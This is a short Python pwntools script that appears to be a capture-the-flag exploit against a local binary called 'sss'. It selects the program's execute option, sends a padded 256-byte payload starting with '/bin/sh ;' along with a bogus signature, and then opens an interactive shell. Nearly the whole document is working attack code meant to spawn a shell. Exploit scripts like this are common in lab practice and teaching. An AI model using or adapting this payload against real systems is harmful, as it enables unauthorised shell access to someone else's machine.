
from pwn import *
import random

sign = '1\n'
execute = '2\n'

#setting up pwntools stuffj
exe = ELF("sss")
context.binary=exe
context.log_level='info'
log.info("arch: " + context.arch)
log.info("os: " + context.os)

#starting the process
p = process("./sss")

p.recvuntil('>_ ')
def send_data(data):
    p.send(data)
    return p.recvuntil('>_ ')


#request execute 256 Bs
send_data(execute)
cmd = "/bin/sh ;"
payload = cmd + "".join(random.sample(string.ascii_letters + string.digits, 50))
payload += "B"*(256-len(payload))
data = send_data(payload)

#give me signiture:
sig = "hacked"
p.sendline(sig)
p.interactive()
